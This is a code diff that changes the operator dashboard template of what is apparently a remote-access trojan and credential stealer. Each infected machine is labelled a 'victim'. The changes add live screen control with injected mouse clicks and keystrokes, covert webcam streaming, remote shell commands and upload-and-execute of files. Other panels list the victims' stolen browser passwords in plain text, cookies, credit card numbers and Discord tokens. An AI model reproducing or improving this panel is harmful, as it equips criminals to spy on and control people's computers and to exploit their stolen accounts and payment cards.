@@ -14,13 +14,13 @@
 
     .control-grid {
         display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-        gap: 15px;
+        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+        gap: 10px;
         margin-top: 20px;
     }
 
     .control-btn {
-        padding: 20px;
+        padding: 15px 10px;
         background: var(--bg-secondary);
         border: 1px solid var(--border-color);
         border-radius: 12px;
@@ -28,19 +28,31 @@
         cursor: pointer;
         transition: all 0.3s;
         text-align: center;
+        font-size: 12px;
     }
 
     .control-btn:hover {
         border-color: var(--purple-primary);
-        transform: translateY(-3px);
-        box-shadow: 0 10px 20px rgba(147, 51, 234, 0.2);
+        transform: translateY(-2px);
+    }
+
+    .control-btn.active {
+        background: var(--purple-primary);
+        border-color: var(--purple-primary);
     }
 
     .control-btn i {
-        font-size: 24px;
+        font-size: 18px;
         display: block;
-        margin-bottom: 10px;
+        margin-bottom: 5px;
         color: var(--purple-light);
+    }
+
+    .live-container {
+        display: grid;
+        grid-template-columns: 1fr 280px;
+        gap: 20px;
+        margin-bottom: 20px;
     }
 
     .live-screen {
@@ -48,6 +60,8 @@
         border-radius: 15px;
         overflow: hidden;
         position: relative;
+        cursor: crosshair;
+        min-height: 400px;
     }
 
     .live-screen img {
@@ -66,12 +80,99 @@
         font-size: 12px;
         font-weight: 600;
         animation: blink 1s infinite;
+        z-index: 10;
     }
 
     @keyframes blink {
         0%, 100% { opacity: 1; }
         50% { opacity: 0.5; }
     }
+
+    .webcam-panel {
+        background: var(--bg-secondary);
+        border-radius: 15px;
+        padding: 15px;
+    }
+
+    .webcam-feed {
+        background: #000;
+        border-radius: 10px;
+        overflow: hidden;
+        aspect-ratio: 4/3;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .webcam-feed img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    .webcam-placeholder {
+        color: var(--text-muted);
+        text-align: center;
+    }
+
+    .webcam-placeholder i {
+        font-size: 40px;
+        margin-bottom: 10px;
+        display: block;
+    }
+
+    .webcam-controls {
+        display: flex;
+        gap: 10px;
+        margin-top: 10px;
+    }
+
+    .webcam-controls button {
+        flex: 1;
+        padding: 10px;
+        border-radius: 8px;
+        border: none;
+        cursor: pointer;
+        font-weight: 500;
+    }
+
+    .btn-cam-start { background: #22c55e; color: white; }
+    .btn-cam-stop { background: #ef4444; color: white; }
+
+    .keyboard-box {
+        margin-top: 15px;
+        padding: 15px;
+        background: var(--bg-secondary);
+        border-radius: 10px;
+    }
+
+    .keyboard-box input {
+        width: 100%;
+        padding: 10px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 8px;
+        color: var(--text-primary);
+        margin-bottom: 10px;
+    }
+
+    .key-row {
+        display: flex;
+        gap: 5px;
+        flex-wrap: wrap;
+    }
+
+    .key-btn {
+        padding: 8px 12px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 5px;
+        color: var(--text-primary);
+        cursor: pointer;
+        font-size: 11px;
+    }
+
+    .key-btn:hover { border-color: var(--purple-primary); }
 
     .online-indicator {
         display: inline-flex;
@@ -80,103 +181,80 @@
         padding: 8px 15px;
         border-radius: 20px;
         font-size: 13px;
-        font-weight: 500;
     }
 
-    .online-indicator.online {
-        background: rgba(34, 197, 94, 0.2);
-        color: #22c55e;
+    .online-indicator.online { background: rgba(34, 197, 94, 0.2); color: #22c55e; border: 1px solid #22c55e; }
+    .online-indicator.offline { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid #ef4444; }
+
+    .data-tabs {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 15px;
+        flex-wrap: wrap;
     }
 
-    .online-indicator.offline {
-        background: rgba(113, 113, 122, 0.2);
-        color: #71717a;
-    }
-
-    .info-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-        gap: 15px;
-        margin-bottom: 20px;
-    }
-
-    .info-card {
-        background: var(--bg-card);
-        border: 1px solid var(--border-color);
-        border-radius: 12px;
-        padding: 15px;
-    }
-
-    .info-card h4 {
-        color: var(--text-muted);
-        font-size: 11px;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        margin-bottom: 5px;
-    }
-
-    .info-card .value {
-        font-size: 14px;
-        font-weight: 500;
-        word-break: break-all;
-    }
-
-    .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
-    .tab-btn { padding: 10px 20px; background: transparent; border: none; color: var(--text-secondary); cursor: pointer; border-radius: 10px; transition: all 0.2s; display: flex; align-items: center; gap: 8px; }
-    .tab-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
-    .tab-btn.active { background: var(--purple-primary); color: white; }
-    .tab-content { display: none; }
-    .tab-content.active { display: block; }
-
-    .data-table { width: 100%; border-collapse: collapse; }
-    .data-table th, .data-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border-color); }
-    .data-table th { background: var(--bg-secondary); font-weight: 500; font-size: 12px; text-transform: uppercase; color: var(--text-secondary); }
-    .data-table tr:hover { background: var(--bg-hover); }
-
-    .password-hidden { font-family: monospace; }
-    .reveal-btn, .copy-btn { background: none; border: none; color: var(--text-secondary); cursor: pointer; padding: 5px; }
-    .reveal-btn:hover, .copy-btn:hover { color: var(--purple-light); }
-
-    .command-modal {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.8);
-        z-index: 1000;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .command-modal.active { display: flex; }
-
-    .modal-content {
-        background: var(--bg-card);
-        border: 1px solid var(--border-color);
-        border-radius: 20px;
-        padding: 30px;
-        width: 500px;
-        max-width: 90%;
-    }
-
-    .token-card {
+    .data-tab {
+        padding: 10px 20px;
         background: var(--bg-secondary);
         border: 1px solid var(--border-color);
-        border-radius: 12px;
-        padding: 20px;
-        margin-bottom: 15px;
+        border-radius: 10px;
+        color: var(--text-primary);
+        cursor: pointer;
     }
 
-    .token-card .token-value {
-        font-family: monospace;
+    .data-tab:hover, .data-tab.active {
+        border-color: var(--purple-primary);
+        background: rgba(147, 51, 234, 0.1);
+    }
+
+    .data-tab .cnt {
+        background: var(--purple-primary);
+        color: white;
+        padding: 2px 8px;
+        border-radius: 10px;
         font-size: 11px;
-        word-break: break-all;
-        background: var(--bg-primary);
-        padding: 10px;
-        border-radius: 8px;
-        margin-top: 10px;
+        margin-left: 5px;
+    }
+
+    .data-content { display: none; }
+    .data-content.active { display: block; }
+
+    .data-item {
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 10px;
+        padding: 15px;
+        margin-bottom: 10px;
+    }
+
+    .data-item:hover { border-color: var(--purple-primary); }
+
+    .cmd-box {
+        display: flex;
+        gap: 10px;
+        margin-top: 15px;
+    }
+
+    .cmd-box input {
+        flex: 1;
+        padding: 12px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 10px;
+        color: var(--text-primary);
+        font-family: monospace;
+    }
+
+    .click-indicator {
+        position: absolute;
+        width: 20px;
+        height: 20px;
+        border: 2px solid #ef4444;
+        border-radius: 50%;
+        pointer-events: none;
+        transform: translate(-50%, -50%);
+        z-index: 100;
+        display: none;
     }
 </style>
 {% endblock %}
@@ -188,306 +266,255 @@
         <li class="nav-item"><a href="{{ url_for('dashboard') }}" class="nav-link"><i class="fas fa-home"></i><span>Dashboard</span></a></li>
         <li class="nav-item"><a href="{{ url_for('builder') }}" class="nav-link"><i class="fas fa-hammer"></i><span>Builder</span></a></li>
         <li class="nav-item"><a href="{{ url_for('settings') }}" class="nav-link"><i class="fas fa-cog"></i><span>Settings</span></a></li>
+        {% if session.is_admin %}
+        <li class="nav-item"><a href="{{ url_for('admin_panel') }}" class="nav-link"><i class="fas fa-crown"></i><span>Admin</span></a></li>
+        {% endif %}
         <li class="nav-item"><a href="{{ url_for('logout') }}" class="nav-link"><i class="fas fa-sign-out-alt"></i><span>Logout</span></a></li>
     </ul>
 </div>
 
 <main class="main-content">
     <div class="header">
-        <div style="display: flex; align-items: center; gap: 20px;">
-            <a href="{{ url_for('dashboard') }}" class="btn btn-secondary"><i class="fas fa-arrow-left"></i></a>
-            <div>
-                <h2>{{ victim.username or 'Unknown' }}</h2>
-                <span style="color: var(--text-muted);">{{ victim.hostname }} • {{ victim.public_ip }}</span>
-            </div>
+        <h2><i class="fas fa-user-secret"></i> {{ victim.username }}@{{ victim.hostname }}</h2>
+        <div style="display: flex; gap: 15px; align-items: center;">
             <span class="online-indicator {{ 'online' if victim.is_online else 'offline' }}">
-                <i class="fas fa-circle" style="font-size: 8px;"></i>
-                {{ 'Online' if victim.is_online else 'Offline' }}
+                <i class="fas fa-circle" style="font-size: 8px;"></i> {{ 'LIVE' if victim.is_online else 'OFFLINE' }}
             </span>
+            <a href="{{ url_for('dashboard') }}" class="btn btn-secondary btn-sm"><i class="fas fa-arrow-left"></i> Back</a>
         </div>
-        <form action="{{ url_for('delete_victim', victim_id=victim.victim_id) }}" method="POST" onsubmit="return confirm('Delete this victim?');">
-            <button type="submit" class="btn btn-danger"><i class="fas fa-trash"></i> Delete</button>
-        </form>
     </div>
 
-    <!-- Remote Control Panel -->
+    <!-- System Info + Controls -->
     <div class="control-panel">
-        <h3><i class="fas fa-gamepad"></i> Remote Control</h3>
+        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; font-size: 13px; color: var(--text-secondary);">
+            <div><strong>IP:</strong> {{ victim.public_ip }}</div>
+            <div><strong>Location:</strong> {{ victim.country }} {{ victim.city }}</div>
+            <div><strong>OS:</strong> {{ victim.os_info or 'Windows' }}</div>
+            <div><strong>Last Seen:</strong> {{ victim.last_seen.strftime('%H:%M:%S') if victim.last_seen else 'Never' }}</div>
+        </div>
         <div class="control-grid">
-            <button class="control-btn" onclick="sendCommand('screenshot')">
-                <i class="fas fa-camera"></i>
-                Screenshot
-            </button>
-            <button class="control-btn" onclick="showFileModal()">
-                <i class="fas fa-file-upload"></i>
-                Send & Execute
-            </button>
-            <button class="control-btn" onclick="sendCommand('shutdown')">
-                <i class="fas fa-power-off"></i>
-                Shutdown
-            </button>
-            <button class="control-btn" onclick="sendCommand('restart')">
-                <i class="fas fa-redo"></i>
-                Restart
-            </button>
-            <button class="control-btn" onclick="showCmdModal()">
-                <i class="fas fa-terminal"></i>
-                Run CMD
-            </button>
-            <button class="control-btn" onclick="sendCommand('uninstall')">
-                <i class="fas fa-trash-alt"></i>
-                Uninstall
-            </button>
+            <button class="control-btn" onclick="sendCmd('screenshot')"><i class="fas fa-camera"></i>Screenshot</button>
+            <button class="control-btn" id="camBtn" onclick="toggleCam()"><i class="fas fa-video"></i>Webcam</button>
+            <button class="control-btn" onclick="sendCmd('shutdown')"><i class="fas fa-power-off"></i>Shutdown</button>
+            <button class="control-btn" onclick="sendCmd('restart')"><i class="fas fa-redo"></i>Restart</button>
+            <button class="control-btn" onclick="document.getElementById('fileInput').click()"><i class="fas fa-file-upload"></i>Send File</button>
+            <button class="control-btn" onclick="sendCmd('uninstall')"><i class="fas fa-trash"></i>Uninstall</button>
+        </div>
+        <input type="file" id="fileInput" style="display:none" onchange="uploadFile(this)">
+    </div>
+
+    <!-- Live Screen + Webcam -->
+    <div class="live-container">
+        <div>
+            <h4 style="margin-bottom: 10px;"><i class="fas fa-tv"></i> Live Screen <small style="color:var(--text-muted);">(Click = mouse click)</small></h4>
+            <div class="live-screen" id="screenBox" onclick="screenClick(event)" oncontextmenu="screenRightClick(event);return false;">
+                <div class="live-badge"><i class="fas fa-circle"></i> LIVE</div>
+                <div class="click-indicator" id="clickDot"></div>
+                <img id="screenImg" src="{{ url_for('uploaded_file', filename=victim.screenshot_path) if victim.screenshot_path else '' }}" alt="Screen">
+            </div>
+            <div class="keyboard-box">
+                <input type="text" id="typeBox" placeholder="Type here and press Enter to send keystrokes..." onkeydown="if(event.key==='Enter'){sendType();event.preventDefault();}">
+                <div class="key-row">
+                    <button class="key-btn" onclick="sendKey('enter')">Enter</button>
+                    <button class="key-btn" onclick="sendKey('tab')">Tab</button>
+                    <button class="key-btn" onclick="sendKey('escape')">Esc</button>
+                    <button class="key-btn" onclick="sendKey('backspace')">⌫</button>
+                    <button class="key-btn" onclick="sendKey('delete')">Del</button>
+                    <button class="key-btn" onclick="sendKey('up')">↑</button>
+                    <button class="key-btn" onclick="sendKey('down')">↓</button>
+                    <button class="key-btn" onclick="sendKey('left')">←</button>
+                    <button class="key-btn" onclick="sendKey('right')">→</button>
+                    <button class="key-btn" onclick="sendKey('win')">Win</button>
+                </div>
+            </div>
+        </div>
+        <div class="webcam-panel">
+            <h4 style="margin-bottom: 10px;"><i class="fas fa-video"></i> Webcam</h4>
+            <div class="webcam-feed">
+                <div class="webcam-placeholder" id="camOff"><i class="fas fa-video-slash"></i><div>Webcam Off</div></div>
+                <img id="camImg" src="" style="display:none;">
+            </div>
+            <div class="webcam-controls">
+                <button class="btn-cam-start" onclick="startCam()"><i class="fas fa-play"></i> Start</button>
+                <button class="btn-cam-stop" onclick="stopCam()"><i class="fas fa-stop"></i> Stop</button>
+            </div>
         </div>
     </div>
 
-    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
-        <!-- Live Screen -->
-        <div class="live-screen">
-            <span class="live-badge"><i class="fas fa-circle"></i> LIVE</span>
-            {% if victim.screenshot_path %}
-            <img src="{{ url_for('uploaded_file', filename=victim.screenshot_path) }}?t={{ victim.last_seen.timestamp() if victim.last_seen else '' }}" alt="Live Screen" id="liveScreen">
-            {% else %}
-            <div style="padding: 100px; text-align: center; color: var(--text-muted);">
-                <i class="fas fa-desktop" style="font-size: 60px; margin-bottom: 20px;"></i>
-                <p>No screenshot available</p>
-                <button class="btn btn-primary" onclick="sendCommand('screenshot')">Capture Now</button>
-            </div>
-            {% endif %}
-        </div>
-
-        <!-- System Info -->
-        <div class="table-container" style="padding: 20px;">
-            <h3 style="margin-bottom: 15px;"><i class="fas fa-info-circle"></i> System Info</h3>
-            <div class="info-grid">
-                <div class="info-card"><h4>OS</h4><div class="value">{{ victim.os_info or 'Unknown' }}</div></div>
-                <div class="info-card"><h4>CPU</h4><div class="value">{{ victim.cpu or 'Unknown' }}</div></div>
-                <div class="info-card"><h4>Local IP</h4><div class="value">{{ victim.local_ip or 'Unknown' }}</div></div>
-                <div class="info-card"><h4>MAC</h4><div class="value">{{ victim.mac_address or 'Unknown' }}</div></div>
-                <div class="info-card"><h4>Country</h4><div class="value">{{ victim.country or 'Unknown' }}</div></div>
-                <div class="info-card"><h4>ISP</h4><div class="value">{{ victim.isp or 'Unknown' }}</div></div>
-            </div>
+    <!-- Remote CMD -->
+    <div class="table-container" style="padding:20px;margin-bottom:20px;">
+        <h4><i class="fas fa-terminal"></i> Remote Command</h4>
+        <div class="cmd-box">
+            <input type="text" id="cmdInput" placeholder="whoami, ipconfig, dir..." onkeydown="if(event.key==='Enter')runCmd()">
+            <button class="btn btn-primary" onclick="runCmd()"><i class="fas fa-play"></i> Run</button>
         </div>
     </div>
 
     <!-- Data Tabs -->
-    <div class="table-container" style="padding: 20px;">
-        <div class="tabs">
-            <button class="tab-btn active" data-tab="passwords"><i class="fas fa-key"></i> Passwords ({{ passwords|length }})</button>
-            <button class="tab-btn" data-tab="cookies"><i class="fas fa-cookie"></i> Cookies ({{ cookies|length }})</button>
-            <button class="tab-btn" data-tab="cards"><i class="fas fa-credit-card"></i> Cards ({{ credit_cards|length }})</button>
-            <button class="tab-btn" data-tab="tokens"><i class="fab fa-discord"></i> Tokens ({{ discord_tokens|length }})</button>
-            <button class="tab-btn" data-tab="wallets"><i class="fab fa-bitcoin"></i> Wallets ({{ wallets|length }})</button>
-        </div>
+    <div class="data-tabs">
+        <button class="data-tab active" onclick="showTab('passwords',this)"><i class="fas fa-key"></i> Passwords<span class="cnt">{{ passwords|length }}</span></button>
+        <button class="data-tab" onclick="showTab('cookies',this)"><i class="fas fa-cookie"></i> Cookies<span class="cnt">{{ cookies|length }}</span></button>
+        <button class="data-tab" onclick="showTab('cards',this)"><i class="fas fa-credit-card"></i> Cards<span class="cnt">{{ credit_cards|length }}</span></button>
+        <button class="data-tab" onclick="showTab('tokens',this)"><i class="fab fa-discord"></i> Tokens<span class="cnt">{{ discord_tokens|length }}</span></button>
+    </div>
 
-        <!-- Passwords -->
-        <div id="passwords" class="tab-content active">
+    <div id="passwords" class="data-content active">
+        <div class="table-container" style="padding:15px;max-height:350px;overflow-y:auto;">
             {% if passwords %}
-            <table class="data-table">
-                <thead><tr><th>Browser</th><th>URL</th><th>Username</th><th>Password</th><th></th></tr></thead>
-                <tbody>
-                    {% for pwd in passwords %}
-                    <tr>
-                        <td><span class="badge badge-info">{{ pwd.browser }}</span></td>
-                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">{{ pwd.url }}</td>
-                        <td>{{ pwd.username }}</td>
-                        <td>
-                            <span class="password-hidden" data-pwd="{{ pwd.password }}">••••••••</span>
-                            <button class="reveal-btn" onclick="togglePwd(this)"><i class="fas fa-eye"></i></button>
-                        </td>
-                        <td><button class="copy-btn" onclick="copyText('{{ pwd.password }}')"><i class="fas fa-copy"></i></button></td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-            {% else %}
-            <div class="empty-state"><i class="fas fa-key"></i><h3>No passwords</h3></div>
-            {% endif %}
+                {% for p in passwords %}
+                <div class="data-item">
+                    <div style="color:var(--text-muted);font-size:11px;margin-bottom:5px;"><i class="fas fa-globe"></i> {{ p.url }}</div>
+                    <span style="background:var(--bg-primary);padding:4px 8px;border-radius:5px;font-family:monospace;font-size:12px;margin-right:10px;"><i class="fas fa-user"></i> {{ p.username }}</span>
+                    <span style="background:var(--bg-primary);padding:4px 8px;border-radius:5px;font-family:monospace;font-size:12px;"><i class="fas fa-lock"></i> {{ p.password }}</span>
+                    <button class="btn btn-secondary btn-sm" style="float:right;" onclick="navigator.clipboard.writeText('{{ p.password }}')"><i class="fas fa-copy"></i></button>
+                </div>
+                {% endfor %}
+            {% else %}<p style="color:var(--text-muted);text-align:center;">No passwords</p>{% endif %}
         </div>
+    </div>
 
-        <!-- Cookies -->
-        <div id="cookies" class="tab-content">
+    <div id="cookies" class="data-content">
+        <div class="table-container" style="padding:15px;max-height:350px;overflow-y:auto;">
             {% if cookies %}
-            <table class="data-table">
-                <thead><tr><th>Browser</th><th>Host</th><th>Name</th><th>Value</th><th></th></tr></thead>
-                <tbody>
-                    {% for c in cookies[:100] %}
-                    <tr>
-                        <td><span class="badge badge-info">{{ c.browser }}</span></td>
-                        <td>{{ c.host }}</td>
-                        <td>{{ c.name }}</td>
-                        <td style="max-width: 150px; overflow: hidden; text-overflow: ellipsis;">{{ c.value[:30] }}...</td>
-                        <td><button class="copy-btn" onclick="copyText('{{ c.value }}')"><i class="fas fa-copy"></i></button></td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-            {% else %}
-            <div class="empty-state"><i class="fas fa-cookie"></i><h3>No cookies</h3></div>
-            {% endif %}
+                {% for c in cookies[:50] %}
+                <div class="data-item">
+                    <strong>{{ c.host }}</strong> - {{ c.name }}
+                    <code style="display:block;margin-top:5px;font-size:10px;color:var(--text-muted);word-break:break-all;">{{ c.value[:80] }}...</code>
+                </div>
+                {% endfor %}
+            {% else %}<p style="color:var(--text-muted);text-align:center;">No cookies</p>{% endif %}
         </div>
+    </div>
 
-        <!-- Cards -->
-        <div id="cards" class="tab-content">
+    <div id="cards" class="data-content">
+        <div class="table-container" style="padding:15px;">
             {% if credit_cards %}
-            <table class="data-table">
-                <thead><tr><th>Browser</th><th>Name</th><th>Number</th><th>Expiry</th><th></th></tr></thead>
-                <tbody>
-                    {% for card in credit_cards %}
-                    <tr>
-                        <td><span class="badge badge-warning">{{ card.browser }}</span></td>
-                        <td>{{ card.name }}</td>
-                        <td>
-                            <span class="password-hidden" data-pwd="{{ card.number }}">•••• •••• •••• ••••</span>
-                            <button class="reveal-btn" onclick="togglePwd(this)"><i class="fas fa-eye"></i></button>
-                        </td>
-                        <td>{{ card.expiry }}</td>
-                        <td><button class="copy-btn" onclick="copyText('{{ card.number }}')"><i class="fas fa-copy"></i></button></td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-            {% else %}
-            <div class="empty-state"><i class="fas fa-credit-card"></i><h3>No credit cards</h3></div>
-            {% endif %}
+                {% for c in credit_cards %}
+                <div class="data-item" style="background:linear-gradient(135deg,#1a1a25,#2d1b4e);">
+                    <div style="font-size:18px;font-family:monospace;letter-spacing:2px;margin-bottom:10px;">{{ c.number }}</div>
+                    <span>{{ c.name or 'Unknown' }}</span> <span style="float:right;">{{ c.expiry }}</span>
+                </div>
+                {% endfor %}
+            {% else %}<p style="color:var(--text-muted);text-align:center;">No cards</p>{% endif %}
         </div>
+    </div>
 
-        <!-- Tokens -->
-        <div id="tokens" class="tab-content">
+    <div id="tokens" class="data-content">
+        <div class="table-container" style="padding:15px;">
             {% if discord_tokens %}
-            {% for t in discord_tokens %}
-            <div class="token-card">
-                <span class="badge badge-danger">{{ t.source }}</span>
-                <span class="badge badge-purple">{{ t.type }}</span>
-                <button class="copy-btn" style="float: right;" onclick="copyText('{{ t.token }}')"><i class="fas fa-copy"></i> Copy</button>
-                <div class="token-value">{{ t.token }}</div>
-            </div>
-            {% endfor %}
-            {% else %}
-            <div class="empty-state"><i class="fab fa-discord"></i><h3>No tokens</h3></div>
-            {% endif %}
-        </div>
-
-        <!-- Wallets -->
-        <div id="wallets" class="tab-content">
-            {% if wallets %}
-            <table class="data-table">
-                <thead><tr><th>Wallet</th><th>Type</th><th>Browser</th><th>Path</th></tr></thead>
-                <tbody>
-                    {% for w in wallets %}
-                    <tr>
-                        <td><span class="badge badge-purple">{{ w.name }}</span></td>
-                        <td>{{ w.type }}</td>
-                        <td>{{ w.browser or 'Desktop' }}</td>
-                        <td style="font-size: 11px; color: var(--text-muted);">{{ w.path }}</td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-            {% else %}
-            <div class="empty-state"><i class="fab fa-bitcoin"></i><h3>No wallets</h3></div>
-            {% endif %}
+                {% for t in discord_tokens %}
+                <div class="data-item">
+                    <i class="fab fa-discord" style="color:#5865F2;margin-right:10px;"></i><strong>{{ t.source }}</strong>
+                    <code style="display:block;margin-top:10px;font-size:10px;background:var(--bg-primary);padding:10px;border-radius:5px;word-break:break-all;">{{ t.token }}</code>
+                    <button class="btn btn-secondary btn-sm" style="margin-top:10px;" onclick="navigator.clipboard.writeText('{{ t.token }}')"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                {% endfor %}
+            {% else %}<p style="color:var(--text-muted);text-align:center;">No tokens</p>{% endif %}
         </div>
     </div>
 </main>
-
-<!-- File Upload Modal -->
-<div id="fileModal" class="command-modal">
-    <div class="modal-content">
-        <h3 style="margin-bottom: 20px;"><i class="fas fa-file-upload"></i> Send & Execute File</h3>
-        <form action="{{ url_for('send_command', victim_id=victim.victim_id) }}" method="POST" enctype="multipart/form-data">
-            <input type="hidden" name="type" value="execute_file">
-            <div class="form-group">
-                <label class="form-label">Select file (.bat, .exe, .ps1, etc.)</label>
-                <input type="file" name="file" class="form-input" required>
-            </div>
-            <div style="display: flex; gap: 10px; margin-top: 20px;">
-                <button type="submit" class="btn btn-primary"><i class="fas fa-paper-plane"></i> Send & Execute</button>
-                <button type="button" class="btn btn-secondary" onclick="closeModals()">Cancel</button>
-            </div>
-        </form>
-    </div>
-</div>
-
-<!-- CMD Modal -->
-<div id="cmdModal" class="command-modal">
-    <div class="modal-content">
-        <h3 style="margin-bottom: 20px;"><i class="fas fa-terminal"></i> Run Command</h3>
-        <form action="{{ url_for('send_command', victim_id=victim.victim_id) }}" method="POST">
-            <input type="hidden" name="type" value="cmd">
-            <div class="form-group">
-                <label class="form-label">Command to execute</label>
-                <input type="text" name="data" class="form-input" placeholder="e.g., ipconfig /all" required>
-            </div>
-            <div style="display: flex; gap: 10px; margin-top: 20px;">
-                <button type="submit" class="btn btn-primary"><i class="fas fa-play"></i> Execute</button>
-                <button type="button" class="btn btn-secondary" onclick="closeModals()">Cancel</button>
-            </div>
-        </form>
-    </div>
-</div>
-
 {% endblock %}
 
 {% block extra_js %}
 <script>
-    // Tabs
-    document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            btn.classList.add('active');
-            document.getElementById(btn.dataset.tab).classList.add('active');
-        });
+const VID = '{{ victim.victim_id }}';
+let camOn = false;
+let screenTimer, camTimer;
+
+// Refresh screen
+function refreshScreen() {
+    fetch(`/api/live/${VID}/screen`).then(r=>r.json()).then(d=>{
+        if(d.image) document.getElementById('screenImg').src = 'data:image/jpeg;base64,'+d.image;
+    }).catch(()=>{});
+}
+
+// Refresh webcam
+function refreshCam() {
+    fetch(`/api/live/${VID}/webcam`).then(r=>r.json()).then(d=>{
+        if(d.image) {
+            document.getElementById('camOff').style.display = 'none';
+            document.getElementById('camImg').style.display = 'block';
+            document.getElementById('camImg').src = 'data:image/jpeg;base64,'+d.image;
+        }
+    }).catch(()=>{});
+}
+
+// Send command
+function sendCmd(type, data={}) {
+    fetch(`/victim/${VID}/command`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({type:type, data:data})
     });
+}
 
-    // Password toggle
-    function togglePwd(btn) {
-        const span = btn.previousElementSibling;
-        const pwd = span.dataset.pwd;
-        if (span.textContent.includes('•')) {
-            span.textContent = pwd;
-            btn.innerHTML = '<i class="fas fa-eye-slash"></i>';
-        } else {
-            span.textContent = '••••••••';
-            btn.innerHTML = '<i class="fas fa-eye"></i>';
-        }
+// Screen click
+function screenClick(e) {
+    const img = document.getElementById('screenImg');
+    const rect = img.getBoundingClientRect();
+    const x = Math.round(e.clientX - rect.left);
+    const y = Math.round(e.clientY - rect.top);
+
+    // Show dot
+    const dot = document.getElementById('clickDot');
+    dot.style.left = (e.clientX - rect.left) + 'px';
+    dot.style.top = (e.clientY - rect.top) + 'px';
+    dot.style.display = 'block';
+    setTimeout(() => dot.style.display = 'none', 200);
+
+    if(e.detail === 2) {
+        sendCmd('mouse_double_click', {x:x, y:y});
+    } else {
+        sendCmd('mouse_click', {x:x, y:y, button:'left'});
     }
+}
 
-    // Copy
-    function copyText(text) {
-        navigator.clipboard.writeText(text);
-        alert('Copied!');
+function screenRightClick(e) {
+    const img = document.getElementById('screenImg');
+    const rect = img.getBoundingClientRect();
+    sendCmd('mouse_click', {x:Math.round(e.clientX-rect.left), y:Math.round(e.clientY-rect.top), button:'right'});
+}
+
+// Keyboard
+function sendType() {
+    const txt = document.getElementById('typeBox').value;
+    if(txt) { sendCmd('type', {text:txt}); document.getElementById('typeBox').value=''; }
+}
+function sendKey(k) { sendCmd('key', {key:k}); }
+
+// CMD
+function runCmd() {
+    const c = document.getElementById('cmdInput').value;
+    if(c) { sendCmd('cmd', c); document.getElementById('cmdInput').value=''; }
+}
+
+// Webcam
+function startCam() { camOn=true; sendCmd('webcam_start'); camTimer=setInterval(refreshCam,2500); }
+function stopCam() { camOn=false; sendCmd('webcam_stop'); clearInterval(camTimer); document.getElementById('camOff').style.display='flex'; document.getElementById('camImg').style.display='none'; }
+function toggleCam() {
+    if(camOn) { stopCam(); document.getElementById('camBtn').classList.remove('active'); }
+    else { startCam(); document.getElementById('camBtn').classList.add('active'); }
+}
+
+// File upload
+function uploadFile(inp) {
+    if(inp.files.length) {
+        const fd = new FormData();
+        fd.append('file', inp.files[0]);
+        fetch(`/victim/${VID}/upload`, {method:'POST', body:fd}).then(()=>alert('File uploaded & will execute!'));
     }
+}
 
-    // Commands
-    function sendCommand(type) {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = '{{ url_for("send_command", victim_id=victim.victim_id) }}';
-        const input = document.createElement('input');
-        input.name = 'type';
-        input.value = type;
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
-    }
+// Tabs
+function showTab(id, btn) {
+    document.querySelectorAll('.data-tab').forEach(t=>t.classList.remove('active'));
+    document.querySelectorAll('.data-content').forEach(c=>c.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    btn.classList.add('active');
+}
 
-    // Modals
-    function showFileModal() { document.getElementById('fileModal').classList.add('active'); }
-    function showCmdModal() { document.getElementById('cmdModal').classList.add('active'); }
-    function closeModals() {
-        document.querySelectorAll('.command-modal').forEach(m => m.classList.remove('active'));
-    }
-
-    // Refresh screenshot every 10 seconds if online
-    {% if victim.is_online %}
-    setInterval(() => {
-        const img = document.getElementById('liveScreen');
-        if (img) {
-            img.src = img.src.split('?')[0] + '?t=' + Date.now();
-        }
-    }, 10000);
-    {% endif %}
+// Start screen refresh
+screenTimer = setInterval(refreshScreen, 2000);
+refreshScreen();
 </script>
 {% endblock %}
